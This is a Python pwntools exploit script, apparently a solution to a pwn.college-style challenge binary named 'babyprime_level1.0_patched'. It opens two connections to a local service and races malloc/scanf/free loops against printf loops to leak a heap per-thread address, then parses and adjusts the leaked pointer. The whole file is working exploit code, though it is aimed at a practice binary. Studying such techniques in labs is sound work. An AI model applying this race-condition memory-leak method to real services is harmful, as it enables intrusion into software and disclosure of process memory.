import time 
from pwn import *
import os

def leak_perthread_addr(r1, r2):
    print("Starting race condition...")
    
    if os.fork() == 0:
        # Child: spam malloc/scanf/free
        for i in range(10000):
            try:
                r1.sendline(b"malloc")
                r1.sendline(b"0")
                r1.sendline(b"scanf") 
                r1.sendline(b"0")
                r1.sendline(b"B" * 1)
                r1.sendline(b"free")
                r1.sendline(b"0")
                if i % 100 == 0:
                    print(f"Child: {i} iterations")
            except:
                break
        exit(0)
    else:
        # Parent: spam printf
        for i in range(10000):
            try:
                r2.sendline(b"printf")
                r2.sendline(b"0")
                if i % 100 == 0:
                    print(f"Parent: {i} iterations")
            except:
                break
        
        os.wait()  # Wait for child
        time.sleep(0.3)
        
        try:
            output = r2.recv(timeout=3)
        except:
            output = b""
        
        print(output)
        # Find leaked data
        lines = output.split(b'\n')
        for line in lines:
            if b'MESSAGE:' in line:
                msg = line.split(b'MESSAGE: ', 1)[1]
                
                # Skip empty and pure input
                if msg in [b'NONE', b''] or len(msg) < 4:
                    continue
                
                # Count contamination (A or B bytes)
                contamination = msg.count(ord('A')) + msg.count(ord('B'))
                
                # Look for non-printable bytes (leaked data) with at most 1 contamination
                has_leak = any(b < 32 or b > 126 for b in msg)
                
                if has_leak and len(msg) >= 4 and contamination <= 1:
                    print(f"Found leak: {repr(msg)}")
                    
                    # Take first 8 bytes, force last byte to null
                    leak_bytes = msg[:8].ljust(8, b'\x00')  # Pad if needed
                    leak_bytes = leak_bytes[:7] + b'\x00'   # Force last byte null
                    
                    leak = u64(leak_bytes)
                    print(f"Cleaned to: {hex(leak)}")
                    
                    if leak > 0x1000:  # Sanity check
                        return leak
        
        return None

# Main
print("Starting babyprime...")
p = process('./babyprime_level1.0_patched')
time.sleep(0.5)

r1 = remote("localhost", 1337)
r2 = remote("localhost", 1337)
print(f"PID: {p.pid}")

# Run exploit
leak = leak_perthread_addr(r1, r2)

if leak:
	leak = leak - 0x42
	print(f"\n[SUCCESS] Leaked: {hex(leak)}")
else:
    print("\n[FAIL] No leak")

print(f"\nGDB: gdb -p {p.pid}")
pause()

r1.close()
r2.close()
p.kill()
